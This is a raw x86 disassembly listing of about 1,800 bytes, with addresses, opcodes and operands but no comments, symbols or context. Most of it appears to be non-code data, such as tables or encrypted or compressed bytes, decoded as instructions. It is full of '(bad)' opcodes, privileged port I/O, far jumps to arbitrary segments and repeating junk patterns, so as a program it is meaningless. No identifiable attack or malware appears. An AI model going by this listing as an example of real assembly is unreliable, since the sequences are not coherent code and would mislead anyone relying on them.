  4214a8:	xlat   BYTE PTR ds:[ebx]
  4214a9:	add    ecx,DWORD PTR [eax]
  4214ab:	mov    al,0xc1
  4214ad:	jmp    0x4214f5
  4214af:	push   ecx
  4214b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214b1:	pop    edx
  4214b2:	test   al,0x9d
  4214b4:	mov    al,0xbd
  4214b6:	aam    0xef
  4214b8:	aad    0x7e
  4214ba:	outs   dx,BYTE PTR ds:[esi]
  4214bb:	jne    0x4214e2
  4214bd:	inc    ecx
  4214be:	dec    esp
  4214bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214c0:	inc    ebx
  4214c1:	add    eax,0x7f7c0665
  4214c6:	lods   al,BYTE PTR ds:[esi]
  4214c7:	or     ecx,edi
  4214c9:	cs pop ss
  4214cb:	cli    
  4214cc:	push   ebx
  4214cd:	pop    esp
  4214ce:	xor    dh,BYTE PTR [eax]
  4214d0:	icebp  
  4214d1:	sbb    cl,BYTE PTR [edi]
  4214d3:	pop    esi
  4214d4:	adc    BYTE PTR [esi-0x3f],0x6b
  4214d8:	dec    eax
  4214d9:	mov    BYTE PTR [eax+0x5a30e41e],ch
  4214df:	pop    ebp
  4214e0:	pop    edx
  4214e1:	xchg   ebp,eax
  4214e2:	mov    eax,0x88688e93
  4214e7:	out    0x0,eax
  4214e9:	add    BYTE PTR [eax],al
  4214eb:	add    BYTE PTR [eax],al
  4214ed:	add    cl,dl
  4214ef:	sub    al,0x14
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0x7afc7d2
  4214fe:	fxch   st(5)
  421500:	add    DWORD PTR [eax],eax
  421502:	bound  eax,QWORD PTR [eax]
  421504:	add    BYTE PTR [eax],al
  421506:	ret    0xb259
  421509:	add    eax,edx
  42150b:	inc    ecx
  42150c:	xlat   BYTE PTR ds:[ebx]
  42150d:	mov    ebp,0x49cb1707
  421512:	pop    ebp
  421513:	fwait
  421514:	popf   
  421515:	sbb    DWORD PTR [ecx],ebp
  421517:	dec    ebp
  421518:	in     al,0xcf
  42151a:	mov    eax,0xb5fe5a19
  42151f:	shl    DWORD PTR [edi+0x333da8a],cl
  421525:	mov    DWORD PTR [esi+esi*2],eax
  421528:	mov    edi,0x17c4d128
  42152d:	xor    eax,0xfe702d92
  421532:	push   es
  421533:	inc    edi
  421534:	push   ebx
  421535:	jmp    0xf428:0xd25c385
  42153c:	fxtract 
  42153e:	mov    bh,0x2f
  421540:	or     dh,BYTE PTR [ebx+0x45]
  421543:	(bad)  
  421544:	xchg   ecx,eax
  421545:	rol    BYTE PTR [bx+0x5d92],0x50
  42154b:	jl     0x4215b0
  42154d:	retf   0x390d
  421550:	ins    BYTE PTR es:[edi],dx
  421551:	inc    ebp
  421552:	mov    ds:0x13d77919,al
  421557:	ret    
  421558:	or     al,0x52
  42155a:	pop    ebp
  42155b:	shl    BYTE PTR ds:0x88eab171,0xf3
  421562:	pop    edi
  421563:	pop    ss
  421564:	stos   DWORD PTR es:[edi],eax
  421565:	cld    
  421566:	cli    
  421567:	push   esp
  421568:	add    BYTE PTR [eax],al
  42156a:	add    BYTE PTR [eax],al
  42156c:	add    BYTE PTR [eax],al
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2+0x3ff7b407],0x3b
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	bound  eax,QWORD PTR [eax]
  421584:	add    BYTE PTR [eax],al
  421586:	cmp    bh,BYTE PTR [ebx+ebx*4+0x4d60ee34]
  42158d:	pusha  
  42158e:	into   
  42158f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421590:	xchg   ecx,eax
  421591:	adc    eax,0x97403619
  421596:	in     al,dx
  421597:	dec    esp
  421598:	lea    esi,[ecx-0x7c47fbd8]
  42159e:	and    eax,0x7ac29e49
  4215a3:	test   DWORD PTR [edx+0x42],ebp
  4215a6:	or     BYTE PTR [eax],bl
  4215a8:	jno    0x421598
  4215aa:	out    0xa2,eax
  4215ac:	inc    ebx
  4215ad:	fisubr DWORD PTR [esi]
  4215af:	xor    bh,BYTE PTR [ecx*8+0x75f4618b]
  4215b6:	or     esi,edi
  4215b8:	xchg   esi,eax
  4215b9:	out    dx,eax
  4215ba:	inc    ebx
  4215bb:	dec    edi
  4215bc:	js     0x421639
  4215be:	jae    0x421629
  4215c0:	xchg   edi,eax
  4215c1:	sbb    DWORD PTR [ecx],esi
  4215c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215c4:	pop    ebx
  4215c5:	out    dx,al
  4215c6:	pop    ss
  4215c7:	imul   edi,DWORD PTR [ebx],0x6b
  4215ca:	out    dx,eax
  4215cb:	lods   eax,DWORD PTR ds:[esi]
  4215cc:	daa    
  4215cd:	sbb    BYTE PTR ds:0x29fbd588,al
  4215d3:	pop    ds
  4215d4:	ret    
  4215d5:	test   BYTE PTR [edx-0x3c],0xac
  4215d9:	lods   eax,DWORD PTR ds:[esi]
  4215da:	mov    ds:0x696dcb57,al
  4215df:	ja     0x4215e3
  4215e1:	sub    esi,DWORD PTR [ebx+0x7125787e]
  4215e7:	int    0x0
  4215e9:	add    BYTE PTR [eax],al
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [edi],ch
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	fnclex 
  4215fc:	mov    eax,ebp
  4215fe:	popf   
  4215ff:	into   
  421600:	add    DWORD PTR [eax],eax
  421602:	bound  eax,QWORD PTR [eax]
  421604:	add    BYTE PTR [eax],al
  421606:	rcr    BYTE PTR [ebx+0x1e],1
  421609:	add    ebx,DWORD PTR [ebx-0x6b]
  42160c:	and    eax,0x245ba7e4
  421611:	dec    ebx
  421612:	ins    BYTE PTR es:[edi],dx
  421613:	in     eax,0x49
  421615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421616:	retf   
  421617:	out    0x8,eax
  421619:	inc    ebp
  42161a:	mov    al,ds:0x6a2c201c
  42161f:	ret    0x8682
  421622:	and    eax,0x7a6d0eba
  421627:	or     DWORD PTR [edx-0x7c639f00],0xc2efe898
  421631:	mov    ebx,0x8ca79ed3
  421637:	mov    edi,0x62e3e997
  42163c:	mov    ds:0x969b6104,eax
  421641:	xor    esi,DWORD PTR [ebp+0x5b]
  421644:	pop    esi
  421645:	pop    edx
  421646:	mov    ds:0xf8de105a,al
  42164b:	jecxz  0x42165a
  42164d:	sbb    edx,esi
  42164f:	mov    al,ds:0x512e3b9e
  421654:	cdq    
  421655:	pop    edi
  421656:	mov    esi,esp
  421658:	js     0x421604
  42165a:	mov    bl,0xb0
  42165c:	out    dx,al
  42165d:	jns    0x421609
  42165f:	in     al,0x81
  421661:	mov    ax,0x8ead
  421665:	popf   
  421666:	mov    cl,0x5a
  421668:	add    BYTE PTR [eax],al
  42166a:	add    BYTE PTR [eax],al
  42166c:	add    BYTE PTR [eax],al
  42166e:	retf   0x76a0
  421671:	dec    ebp
  421672:	jle    0x421653
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0xbd9d819f,al
  42167e:	dec    esi
  421680:	add    DWORD PTR [eax],eax
  421682:	bound  eax,QWORD PTR [eax]
  421684:	add    BYTE PTR [eax],al
  421686:	shl    BYTE PTR [ecx+0x6d],0xb
  42168a:	cmp    al,0x59
  42168c:	fcomp  QWORD PTR [ecx+0x987ec21]
  421692:	mov    esi,0xf528c657
  421697:	imul   BYTE PTR ss:[ecx+0x7d]
  42169b:	fistp  QWORD PTR [eax-0x7749c026]
  4216a1:	pusha  
  4216a2:	jno    0x4216e4
  4216a4:	cmp    bl,BYTE PTR [ebx+ebp*8]
  4216a7:	push   ebp
  4216a8:	add    dl,BYTE PTR [ebx]
  4216aa:	shl    DWORD PTR [esi+eax*2-0x3728ab7f],cl
  4216b1:	xor    DWORD PTR [eax+0x62],ebp
  4216b4:	ins    BYTE PTR es:[edi],dx
  4216b5:	(bad)  [esi+eiz*1]
  4216b8:	out    0x8f,eax
  4216ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216bb:	push   esp
  4216bc:	cmp    BYTE PTR [ebp+0x4c6be0f8],dh
  4216c2:	icebp  
  4216c3:	and    edx,DWORD PTR [edi+0x2de39375]
  4216c9:	shl    BYTE PTR [esp+edi*8-0x10db00ef],cl
  4216d0:	dec    ecx
  4216d1:	faddp  st(6),st
  4216d3:	jae    0x421714
  4216d5:	and    edi,ebx
  4216d7:	aaa    
  4216d8:	inc    eax
  4216d9:	sub    BYTE PTR [edx-0x61],cl
  4216dc:	and    eax,0xd605901a
  4216e1:	cmp    DWORD PTR [edx-0x33bb36b],edx
  4216e7:	test   al,0x0
  4216e9:	add    BYTE PTR [eax],al
  4216eb:	add    BYTE PTR [eax],al
  4216ed:	add    dh,al
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	(bad)  
  4216fb:	lock call 0x6200:0x1cf6172
  421703:	add    BYTE PTR [eax],al
  421705:	add    cl,ah
  421707:	hlt    
  421708:	sbb    esi,ebx
  42170a:	cdq    
  42170b:	adc    ebp,DWORD PTR [ebp-0x8]
  42170e:	inc    ecx
  42170f:	lds    edx,FWORD PTR [edi-0x4c7c1cab]
  421715:	mov    esp,0xbb8af137
  42171a:	jmp    esp
  42171c:	ins    BYTE PTR es:[edi],dx
  42171d:	in     eax,0xcb
  42171f:	mov    dh,0x85
  421721:	addr16 add al,0xe3
  421724:	not    DWORD PTR [eax]
  421726:	popf   
  421727:	mov    cl,0x0
  421729:	add    ch,al
  42172b:	test   ah,ah
  42172d:	ins    DWORD PTR es:[edi],dx
  42172e:	dec    ebp
  42172f:	test   BYTE PTR [eax],cl
  421731:	ja     0x42179b
  421733:	imul   BYTE PTR [edx-0x4e453217]
  421739:	ins    BYTE PTR es:[edi],dx
  42173a:	sbb    eax,0x71011f77
  42173f:	(bad)  
  421740:	mov    ss,WORD PTR [ebx+0x3aabbe18]
  421746:	push   cs
  421747:	xor    eax,0x42a4f194
  42174c:	pop    ebx
  42174d:	repz jmp 0x4f9573da
  421753:	dec    ecx
  421754:	pop    eax
  421755:	int3   
  421756:	add    ch,BYTE PTR [esi]
  421758:	stos   BYTE PTR es:[edi],al
  421759:	jge    0x4217a6
  42175b:	or     DWORD PTR [ebp+0x53],ebp
  42175e:	jne    0x42171a
  421760:	scas   al,BYTE PTR es:[edi]
  421761:	nop
  421762:	dec    esp
  421763:	sbb    eax,0x7e1a01a7
  421768:	add    BYTE PTR [eax],al
  42176a:	add    BYTE PTR [eax],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	push   edx
  42176f:	xor    al,0x40
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0xf86a4e09
  42177b:	jg     0x42177d
  42177d:	sti    
  42177e:	ret    
  42177f:	iret   
  421780:	add    DWORD PTR [eax],eax
  421782:	bound  eax,QWORD PTR [eax]
  421784:	add    BYTE PTR [eax],al
  421786:	aaa    
  421787:	push   ds
  421788:	xor    edi,edi
  42178a:	out    dx,al
  42178b:	call   0xb34f5fe7
  421790:	xlat   BYTE PTR ds:[ebx]
  421791:	fidiv  DWORD PTR [esi+0x7e]
  421794:	mov    eax,0xc6d120c7
  421799:	sub    DWORD PTR [eax+0x39f7f69b],0x27
  4217a0:	data16 shl al,cl
  4217a3:	mov    al,BYTE PTR [eax+ebx*2]
  4217a6:	push   ecx
  4217a7:	pmaxub mm0,QWORD PTR [ebx+eax*2]
  4217ab:	dec    edx
  4217ac:	sub    ch,BYTE PTR [eax-0x16]
  4217af:	mov    edx,0x404e0d9c
  4217b4:	xchg   esp,eax
  4217b5:	lods   eax,DWORD PTR ds:[esi]
  4217b6:	add    eax,0x153c2e44
  4217bb:	xor    eax,0x45711147
  4217c0:	(bad)  
  4217c1:	imul   edi
  4217c3:	pop    ebx
  4217c4:	or     eax,0x7d1ca9c5
  4217c9:	fcmovne st,st(4)
  4217cb:	leave  
  4217cc:	adc    dh,bl
  4217ce:	xor    BYTE PTR [eax+eiz*4-0x1],dh
  4217d2:	sbb    al,0x32
  4217d4:	pop    edx
  4217d5:	dec    eax
  4217d6:	jnp    0x4217ac
  4217d8:	cmc    
  4217d9:	out    dx,eax
  4217da:	rcl    dl,cl
  4217dc:	push   esp
  4217dd:	jle    0x42176f
  4217df:	dec    eax
  4217e0:	mov    ds:0x31104a72,al
  4217e5:	sbb    al,ah
  4217e7:	mov    ds:0x0,al
  4217ec:	add    BYTE PTR [eax],al
  4217ee:	dec    ecx
  4217ef:	inc    esi
  4217f0:	sub    BYTE PTR [eax],dh
  4217f2:	das    
  4217f3:	jle    0x42184e
  4217f5:	jg     0x4217bd
  4217f7:	imul   esi,eax,0xffffffd5
  4217fa:	mov    eax,0xe79d203d
  4217ff:	loop   0x421802
  421801:	add    BYTE PTR [edx+0x0],ah
  421804:	add    BYTE PTR [eax],al
  421806:	(bad)  
  421807:	add    eax,0x47bc1516
  42180c:	mov    bh,0xba
  42180e:	lahf   
  42180f:	mov    BYTE PTR [edi],ah
  421811:	jg     0x4217b0
  421813:	push   ebx
  421814:	xchg   edi,eax
  421815:	lock xchg esp,eax
  421817:	clc    
  421818:	ins    BYTE PTR es:[edi],dx
  421819:	cmc    
  42181a:	and    DWORD PTR [edx],0x2e2548d1
  421820:	test   al,0xfe
  421822:	mov    ebx,0x5f30b5bd
  421827:	outs   dx,DWORD PTR ds:[esi]
  421828:	ja     0x421891
  42182a:	pop    ecx
  42182b:	cmp    eax,0x287f523a
  421830:	mov    eax,0x678b9fde
  421835:	or     al,0x18
  421837:	jle    0x42184a
  421839:	pop    esi
  42183a:	sti    
  42183b:	mov    esi,0x4930afad
  421840:	popf   
  421841:	push   esp
  421842:	jmp    0x4217ca
  421844:	or     BYTE PTR [ecx-0x5b],0xda
  421848:	es loope 0x4217d1
  42184b:	test   eax,0xd8f7f309
  421850:	cs enter 0xe557,0x57
  421855:	and    DWORD PTR [edx+0x29093f28],ebp
  42185b:	dec    edx
  42185c:	shr    DWORD PTR [esi-0x5f8fdd34],1
  421862:	int3   
  421863:	pop    eax
  421864:	dec    ecx
  421865:	mov    eax,0x8aea
  42186a:	add    BYTE PTR [eax],al
  42186c:	add    BYTE PTR [eax],al
  42186e:	addr16 (bad) 
  421870:	and    dh,dh
  421872:	mov    eax,ds:0xe7d7f7f6
  421877:	mov    eax,0xba2cda72
  42187c:	call   0x22561dc
  421881:	add    BYTE PTR [edx+0x0],ah
  421884:	add    BYTE PTR [eax],al
  421886:	(bad)  
  421887:	and    esp,DWORD PTR [ebp+0x6e6017b]
  42188d:	out    0x41,al
  42188f:	mov    esi,0x12022da3
  421894:	lods   eax,DWORD PTR ds:[esi]
  421895:	or     DWORD PTR [ebp+0x6be2f31a],esp
  42189b:	lods   al,BYTE PTR ds:[esi]
  42189c:	sbb    bl,dl
  42189e:	mov    ecx,0x31cb55ef
  4218a3:	push   es
  4218a4:	enter  0xd398,0xf2
  4218a8:	cdq    
  4218a9:	mov    ecx,0xb2bd9e68
  4218ae:	(bad)  [ecx]
  4218b0:	stos   BYTE PTR es:[edi],al
  4218b1:	stc    
  4218b2:	daa    
  4218b3:	in     eax,dx
  4218b4:	neg    ch
  4218b6:	cld    
  4218b7:	ret    0x6954
  4218ba:	scas   al,BYTE PTR es:[edi]
  4218bb:	add    ecx,ebx
  4218bd:	test   eax,0x6303b431
  4218c2:	lea    ebp,[esi+eax*4+0x59]
  4218c6:	daa    
  4218c7:	pminub mm4,mm3
  4218ca:	dec    ebp
  4218cb:	ret    
  4218cc:	in     al,dx
  4218cd:	std    
  4218ce:	fs (bad) 
  4218d0:	(bad)  
  4218d1:	cld    
  4218d2:	cmp    BYTE PTR [ecx-0x3d81a6f1],cl
  4218d8:	out    dx,al
  4218d9:	leave  
  4218da:	mov    edi,DWORD PTR [eax]
  4218dc:	in     eax,dx
  4218dd:	lods   eax,DWORD PTR ds:[esi]
  4218de:	imul   ebp,edi,0xf3a9396e
  4218e4:	and    esp,edx
  4218e6:	and    edx,esi
  4218e8:	add    BYTE PTR [eax],al
  4218ea:	add    BYTE PTR [eax],al
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	ret    
  4218ef:	or     eax,0xefee66a6
  4218f4:	ret    
  4218f5:	lods   eax,DWORD PTR ds:[esi]
  4218f6:	sub    al,0xb8
  4218f8:	mov    ds:0xae719c47,eax
  4218fd:	xor    al,0xab
  4218ff:	jecxz  0x421902
  421901:	add    BYTE PTR [edx+0x0],ah
  421904:	add    BYTE PTR [eax],al
  421906:	retf   0x270d
  421909:	leave  
  42190a:	inc    ebp
  42190b:	call   0xa9559ab7
  421910:	and    edi,DWORD PTR [ecx-0x2b]
  421913:	daa    
  421914:	xchg   DWORD PTR [esi+0x4a],ebp
  421917:	addr16 cld 
  421919:	popa   
  42191a:	in     al,0x4f
  42191c:	ret    0x34b3
  42191f:	jge    0x421933
  421921:	xchg   ebp,eax
  421922:	pop    edx
  421923:	adc    eax,0x5862f0dc
  421928:	jo     0x4219a2
  42192a:	add    bl,dh
  42192c:	sub    dl,BYTE PTR [eax+0x6a]
  42192f:	loope  0x4218b6
  421931:	add    BYTE PTR [ebx+esi*1-0x59321c87],dh
  421938:	inc    ebx
  421939:	push   eax
  42193a:	pop    edi
  42193b:	fisub  DWORD PTR [esi-0x10caa10c]
  421941:	mov    ah,0x32
  421943:	and    DWORD PTR [edx+edi*1],0x63
  421947:	lock dec edx
  421949:	into   
  42194a:	loope  0x4218d9
  42194c:	jp     0x4219c5
  42194e:	fcom   DWORD PTR [edi+ebp*4+0x40af382f]
  421955:	adc    bh,ch
  421957:	mov    ds:0x561b1f37,al
  42195c:	jnp    0x421999
  42195e:	jmp    0x42196c
  421960:	lods   eax,DWORD PTR ds:[esi]
  421961:	retf   0x68a4
  421964:	or     eax,0xf21d05
  421969:	add    BYTE PTR [eax],al
  42196b:	add    BYTE PTR [eax],al
  42196d:	add    cl,bl
  42196f:	ret    0x4905
  421972:	pop    ds
  421973:	iret   
  421974:	fst    st(2)
  421976:	enter  0xf86f,0xd2
  42197a:	or     bl,BYTE PTR [ecx]
  42197c:	adc    ebx,DWORD PTR [ebp+0x1e40d]
  421982:	bound  eax,QWORD PTR [eax]
  421984:	add    BYTE PTR [eax],al
  421986:	mov    al,ds:0xdec18c48
  42198b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42198c:	xor    DWORD PTR [edi-0x45],ebp
  42198f:	jae    0x421931
  421991:	ins    BYTE PTR es:[edi],dx
  421992:	cmp    DWORD PTR [ebx-0x446008f],ebx
  421998:	or     ch,BYTE PTR [edx]
  42199a:	je     0x421940
  42199c:	add    BYTE PTR [esi],dh
  42199e:	fwait
  42199f:	mov    dh,0xf9
  4219a1:	rol    BYTE PTR [edi-0x5a],1
  4219a4:	cmp    edi,0xa
  4219a7:	inc    edx
  4219a8:	xor    DWORD PTR [eax],ebp
  4219aa:	aas    
  4219ab:	mov    cl,0xfd
  4219ad:	mov    WORD PTR [eax+0x43b6522c],es
  4219b3:	test   BYTE PTR [eax],ch
  4219b5:	ret    
  4219b6:	sub    BYTE PTR [edx-0x58],0x19
  4219ba:	jno    0x4219c3
  4219bc:	pop    esp
  4219bd:	loope  0x421a21
  4219bf:	adc    eax,0x6e97878
  4219c4:	xor    DWORD PTR [edx-0x2],esp
  4219c7:	and    ebx,DWORD PTR [ebx+0x4197ae77]
  4219cd:	pop    es
  4219ce:	ins    BYTE PTR es:[edi],dx
  4219cf:	pop    ebp
  4219d0:	sub    al,0x74
  4219d2:	pop    esi
  4219d3:	inc    esp
  4219d4:	jmp    0x421a1d
  4219d6:	ret    
  4219d7:	jp     0x4219dd
  4219d9:	inc    esi
  4219da:	xor    eax,0x9f1d0ec9
  4219df:	stos   DWORD PTR es:[edi],eax
  4219e0:	rcr    bh,1
  4219e2:	cmc    
  4219e3:	loope  0x421985
  4219e5:	std    
  4219e6:	sub    eax,eax
  4219e8:	add    BYTE PTR [eax],al
  4219ea:	add    BYTE PTR [eax],al
  4219ec:	add    BYTE PTR [eax],al
  4219ee:	popa   
  4219ef:	pop    edi
  4219f0:	lock (bad) 
  4219f2:	(bad)  
  4219f3:	out    dx,eax
  4219f4:	repz pop edi
  4219f6:	mov    dl,0xc5
  4219f8:	ret    
  4219f9:	in     eax,dx
  4219fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219fb:	xor    al,0x1f
  4219fd:	call   0x6:0x1e46f
  421a04:	add    BYTE PTR [eax],al
  421a06:	fs push cs
  421a08:	inc    esi
  421a09:	add    bl,BYTE PTR [ebp+edx*1-0x70000000]
  421a10:	inc    edx
  421a11:	add    BYTE PTR [eax+edx*4],al
  421a14:	inc    edx
  421a15:	add    BYTE PTR [eax],cl
  421a17:	nop
  421a18:	inc    edx
  421a19:	add    BYTE PTR [eax+edx*4],cl
  421a1c:	inc    edx
  421a1d:	add    BYTE PTR [eax],dl
  421a1f:	nop
  421a20:	inc    edx
  421a21:	add    BYTE PTR [eax+edx*4],dl
  421a24:	inc    edx
  421a25:	add    BYTE PTR [eax],bl
  421a27:	nop
  421a28:	inc    edx
  421a29:	add    BYTE PTR [eax+edx*4],bl
  421a2c:	inc    edx
  421a2d:	add    BYTE PTR [eax],al
  421a2f:	mov    al,ds:0xa0040042
  421a34:	inc    edx
  421a35:	add    BYTE PTR [eax],cl
  421a37:	mov    al,ds:0xa00c0042
  421a3c:	inc    edx
  421a3d:	add    BYTE PTR [eax],dl
  421a3f:	mov    al,ds:0xa0140042
  421a44:	inc    edx
  421a45:	add    BYTE PTR [eax],bl
  421a47:	mov    al,ds:0xa01c0042
  421a4c:	inc    edx
  421a4d:	add    BYTE PTR [eax],al
  421a4f:	mov    al,0x42
  421a51:	add    BYTE PTR [eax+esi*4],al
  421a54:	inc    edx
  421a55:	add    BYTE PTR [eax],cl
  421a57:	mov    al,0x42
  421a59:	add    BYTE PTR [eax+esi*4],cl
  421a5c:	inc    edx
  421a5d:	add    BYTE PTR [eax],dl
  421a5f:	mov    al,0x42
  421a61:	add    BYTE PTR [eax+esi*4],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],bl
  421a67:	mov    al,0x42
  421a69:	add    BYTE PTR [eax+esi*4],bl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax+0x66],bh
  421a70:	ins    BYTE PTR es:[edi],dx
  421a71:	jp     0x421aca
  421a73:	jbe    0x421abc
  421a75:	ja     0x421aba
  421a77:	js     0x421ac1
  421a79:	jno    0x421ade
  421a7b:	inc    edx
  421a7c:	inc    bx
  421a7e:	push   ebp
  421a7f:	jno    0x421af7
  421a81:	ja     0x421aea
  421a83:	dec    edi
  421a84:	dec    esp
  421a85:	dec    ebp
  421a86:	inc    edx
  421a87:	jno    0x421afa
  421a89:	jae    0x421ade
  421a8b:	push   eax
  421a8c:	arpl   WORD PTR [ebx+0x36],dx
  421a8f:	push   ds
  421a90:	inc    edx
  421a91:	add    BYTE PTR [esi],bh
  421a93:	push   ds
  421a94:	inc    edx
  421a95:	add    dh,dl
  421a97:	sbb    al,0x42
  421a99:	add    bh,ch
  421a9b:	or     esi,DWORD PTR [edx+0x304e790e]
  421aa1:	dec    esi
  421aa2:	xchg   DWORD PTR [edi+0x3d],ecx
  421aa5:	dec    esi
  421aa6:	scas   eax,DWORD PTR es:[edi]
  421aa7:	dec    edi
  421aa8:	ds dec esi
  421aaa:	js     0x421afa
  421aac:	cmp    ecx,DWORD PTR [esi-0x64]
  421aaf:	dec    edi
  421ab0:	inc    esp
  421ab1:	dec    esi
  421ab2:	jae    0x421b02
  421ab4:	inc    ecx
  421ab5:	dec    esi
  421ab6:	xor    BYTE PTR [esi+0x40],cl
  421ab9:	dec    esi
  421aba:	pop    esp
  421abb:	pop    ebp
  421abc:	pop    edi
  421abd:	push   edx
  421abe:	cmp    DWORD PTR [esi+0x79],ecx
  421ac1:	dec    esi
  421ac2:	xor    BYTE PTR [esi-0x79],cl
  421ac5:	dec    edi
  421ac6:	cmp    eax,0x3e4faf4e
  421acb:	dec    esi
  421acc:	js     0x421b1c
  421ace:	cmp    ecx,DWORD PTR [esi-0x64]
  421ad1:	dec    edi
  421ad2:	inc    esp
  421ad3:	dec    esi
  421ad4:	mov    DWORD PTR [edi+0x41],ecx
  421ad7:	dec    esi
  421ad8:	xor    BYTE PTR [esi+0x40],cl
  421adb:	dec    esi
  421adc:	pop    esp
  421add:	ins    DWORD PTR es:[edi],dx
  421ade:	pop    edi
  421adf:	bound  edi,QWORD PTR [ecx]
  421ae1:	dec    esi
  421ae2:	jns    0x421b32
  421ae4:	xor    BYTE PTR [esi-0x80],cl
  421ae7:	dec    edi
  421ae8:	cmp    eax,0x394e734e
  421aed:	dec    esi
  421aee:	mov    ds:0x304e3a4f,al
  421af3:	dec    esi
  421af4:	inc    esi
  421af5:	dec    esi
  421af6:	pop    esp
  421af7:	jge    0x421b58
  421af9:	jb     0x421b6a
  421afb:	sub    BYTE PTR [esi-0x7d],0x7e
  421aff:	xchg   ebx,eax
  421b00:	jns    0x421a92
  421b02:	aas    
  421b03:	dec    esi
  421b04:	test   BYTE PTR [edi+0x30],cl
  421b07:	dec    esi
  421b08:	test   BYTE PTR [edi+0x3c],cl
  421b0b:	dec    esi
  421b0c:	mov    ds:0x734e394f,al
  421b11:	dec    esi
  421b12:	inc    ebp
  421b13:	dec    esi
  421b14:	xor    BYTE PTR [esi+0x44],cl
  421b17:	dec    esi
  421b18:	pop    esp
  421b19:	lea    ebx,[edi-0x7e]
  421b1c:	outs   dx,DWORD PTR ds:[esi]
  421b1d:	xchg   edx,eax
  421b1e:	outs   dx,BYTE PTR ds:[esi]
  421b1f:	xchg   ebx,eax
  421b20:	jle    0x421ac5
  421b22:	jns    0x421ac4
  421b24:	aas    
  421b25:	dec    esi
  421b26:	test   BYTE PTR [edi+0x30],cl
  421b29:	dec    esi
  421b2a:	test   BYTE PTR [edi+0x3c],cl
  421b2d:	dec    esi
  421b2e:	mov    ds:0x894e394f,al
  421b33:	dec    edi
  421b34:	inc    ebp
  421b35:	dec    esi
  421b36:	xor    BYTE PTR [esi+0x44],cl
  421b39:	dec    esi
  421b3a:	pop    esp
  421b3b:	popf   
  421b3c:	pop    edi
  421b3d:	xchg   edx,eax
  421b3e:	outs   dx,DWORD PTR ds:[esi]
  421b3f:	mov    ds:0xb37ea36e,al
  421b44:	jns    0x421af6
  421b46:	aas    
  421b47:	dec    esi
  421b48:	mov    cs,WORD PTR [edi+0x30]
  421b4b:	dec    esi
  421b4c:	lods   al,BYTE PTR ds:[esi]
  421b4d:	dec    edi
  421b4e:	cmp    eax,0x394e734e
  421b53:	dec    esi
  421b54:	mov    eax,ds:0x304e3a4f
  421b59:	dec    esi
  421b5a:	inc    esp
  421b5b:	dec    esi
  421b5c:	pop    esp
  421b5d:	lods   eax,DWORD PTR ds:[esi]
  421b5e:	pop    edi
  421b5f:	mov    ds:0xb36eb26f,al
  421b64:	jle    0x421b29
  421b66:	jns    0x421b28
  421b68:	aas    
  421b69:	dec    esi
  421b6a:	mov    cs,WORD PTR [edi+0x30]
  421b6d:	dec    esi
  421b6e:	lods   al,BYTE PTR ds:[esi]
  421b6f:	dec    edi
  421b70:	cmp    eax,0x394e7e4e
  421b75:	dec    esi
  421b76:	lahf   
  421b77:	dec    edi
  421b78:	cmp    ecx,DWORD PTR [esi+0x30]
  421b7b:	dec    esi
  421b7c:	inc    ebp
  421b7d:	dec    esi
  421b7e:	pop    esp
  421b7f:	mov    ebp,0xc26fb25f
  421b84:	outs   dx,BYTE PTR ds:[esi]
  421b85:	ret    
  421b86:	jle    0x421b5b
  421b88:	jns    0x421b5a
  421b8a:	aas    
  421b8b:	dec    esi
  421b8c:	mov    cs,WORD PTR [edi+0x30]
  421b8f:	dec    esi
  421b90:	lods   al,BYTE PTR ds:[esi]
  421b91:	dec    edi
  421b92:	cmp    eax,0x394f804e
  421b97:	dec    esi
  421b98:	lods   al,BYTE PTR ds:[esi]
  421b99:	dec    edi
  421b9a:	cmp    cl,BYTE PTR [esi+0x30]
  421b9d:	dec    esi
  421b9e:	inc    esi
  421b9f:	dec    esi
  421ba0:	pop    esp
  421ba1:	int    0x5f
  421ba3:	ret    0xd26f
  421ba6:	outs   dx,BYTE PTR ds:[esi]
  421ba7:	sar    DWORD PTR [esi-0x1d],cl
  421baa:	jns    0x421b8c
  421bac:	aas    
  421bad:	dec    esi
  421bae:	mov    cs,WORD PTR [edi+0x30]
  421bb1:	dec    esi
  421bb2:	lods   al,BYTE PTR ds:[esi]
  421bb3:	dec    edi
  421bb4:	cmp    eax,0x394f834e
  421bb9:	dec    esi
  421bba:	mov    ds:0x304e3a4f,al
  421bbf:	dec    esi
  421bc0:	inc    esp
  421bc1:	dec    esi
  421bc2:	pop    esp
  421bc3:	fstp   QWORD PTR [edi-0x2e]
  421bc6:	outs   dx,DWORD PTR ds:[esi]
  421bc7:	loop   0x421c37
  421bc9:	jecxz  0x421c49
  421bcb:	repz jns 0x421bbe
  421bce:	aas    
  421bcf:	dec    esi
  421bd0:	lea    ecx,[edi+0x30]
